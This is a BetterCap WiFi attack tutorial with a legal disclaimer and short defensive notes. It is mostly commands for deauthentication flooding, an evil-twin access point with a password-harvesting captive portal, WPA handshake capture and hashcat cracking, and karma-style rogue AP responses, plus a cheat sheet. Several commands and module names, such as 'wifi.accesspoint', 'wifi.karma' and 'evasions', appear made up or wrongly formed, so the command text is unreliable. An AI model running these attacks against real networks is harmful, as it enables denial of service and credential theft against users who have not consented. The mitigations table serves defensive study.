# BetterCap WiFi Security Tutorial

> ⚠️ **Legal Notice**: WiFi attacks against networks you don't own or aren't authorized to test are illegal (CFAA in the US, Computer Misuse Act in the UK, etc.). This tutorial is for **authorized penetration testing** and **your own networks only**. Always get written permission before testing any network.

---

## 1. Setup

### Install BetterCap

```bash
# Arch Linux
sudo pacman -S bettercap

# Or via Go
sudo go install github.com/bettercap/bettercap@latest

# Update
sudo bettercap -upgrade
```

### Set Your Interface

```bash
# Check interfaces
ip link show

# Put WiFi adapter in monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# Verify monitor mode
iwconfig
# You should see Mode:Monitor on your interface (e.g., wlan0mon)
```

---

## 2. Launch BetterCap Interactive Session

```bash
sudo bettercap -iface wlan0mon
```

You'll enter the `bettercap>` prompt.

---

## 3. Reconnaissance — Discovery

### Scan for Networks & Clients

```
# Show known WiFi networks
wifi.show

# Show connected clients
wifi.clients.show
```

### Probe Request Sniffing (Passive)

```bash
# Set ticker for continuous display
set wifi.show.clients on
set wifi.show.ap.on true

# Start WiFi recon
wifi.recon on
```

This passively captures probe requests and BLE advertisements — shows you what devices are looking for networks, even if they haven't connected yet.

---

## 4. Deauthentication Attack (Authorized Testing Only)

This is the classic WiFi DoS — forces clients off an AP by sending forged deauth frames. Used only to **test your own network's resilience**.

```bash
# Target a specific AP by BSSID
wifi.deauth AA:BB:CC:DD:EE:FF

# Target all APs on channel 6
wifi.deauth -c 6

# Target a specific client
wifi.deauth AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66
```

**Defensive insight**: If your APs disconnect under this, your controller isn't filtering deauth frames. WPA3-SAE and 802.11w (management frame protection) mitigate this.

---

## 5. Evil Twin / Rogue AP (Captive Portal for Auth Testing)

Spoof a known AP and capture handshakes or redirect clients for authorized phishing tests.

```bash
# Create a rogue AP mimicking a target SSID
wifi.accesspoint -essid "TargetNetwork" -password "Password123" -channel 6 -bssid AA:BB:CC:DD:EE:FF

# Start the AP
wifi.accesspoint on

# Set up a captive portal to capture creds
http.server on -port 80
set http.ssl false
set http.script /path/to/cred_captcha.js
evasions -script
set http.custom_responses.login_page body="<h1>Re-authenticate</h1><form method=post><input name=password></form>"
```

**Defensive insight**: Train users to check BSSIDs, use enterprise WPA2/3 with 802.1X, and deploy rogue AP detection on your WLC.

---

## 6. Handshake Capture for Authorized Cracking (Offline)

Capture WPA handshakes from **your own network** for offline password auditing.

```bash
# Set the target
set wifi.handshake.target AA:BB:CC:DD:EE:FF
set wifi.handshake.file /home/user/handshake.pcap

# Start sniffing
wifi.sniff on
```

Force a reauth (deauth or wait for a legitimate roam) to capture the 4-way handshake.

Then crack offline with hashcat:

```bash
# Convert bettercap output to hashcat format
hcxpcapngtool -o hash.hc22000 /home/user/handshake.pcap

# Crack with hashcat
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -w 4
```

---

## 7. WiFi Deauth + Karma (Auto-Responder to Any Beacon)

Karma attacks respond to *any* probe request with your rogue AP — extremely effective for targeting devices that auto-connect to known SSIDs.

```bash
# Enable karma mode (responds to any SSID probe)
wifi.karma on

# Your rogue AP now answers "OfficeWiFi" from a device that has it saved
```

**Defensive insight**: Disable "auto-connect" on devices and forget unused networks. Enterprise networks use certificate-based validation (EAP-TLS) to prevent this.

---

## 8. Session Control & Scripting

### Save/Restore
```bash
# Save session
set session.save true
set session.file /home/user/bettercap.session
```

### Script (non-interactive mode)
```bash
sudo bettercap -iface wlan0mon -caplet /path/to/caplets/wifi_audit.cap
```

Example caplet (`wifi_audit.cap`):
```
set wifi.show.clients on
set wifi.show.ap.on true
wifi.recon on
sleep 30
wifi.sniff on
sleep 60
wifi.sniff off
quit
```

---

## 9. Defensive Takeaways

| Attack | Mitigation |
|---|---|
| Deauth DoS | 802.11w (MFP), WPA3, IDS (Airodump/wIDS) |
| Evil Twin | 802.1X, certificate pinning, BSSID checking |
| Karma/Auto-connect | Disable auto-connect per-network, EAP-TLS |
| Handshake capture offine | Use WPA3-SAE (resistant to offline cracking), long passphrases |
| Probe sniffing | Use random MACs (`macchanger`), minimize probe requests |

---

## Quick Reference Cheat Sheet

```
wifi.show              — list APs
wifi.clients.show      — list clients
wifi.recon on          — passive scan
wifi.deauth <bssid>    — send deauth (own net only!)
wifi.accesspoint -essid X -password Y -channel Z
wifi.sniff on          — capture handshakes
wifi.karma on          — responder mode
quit                   — exit
```
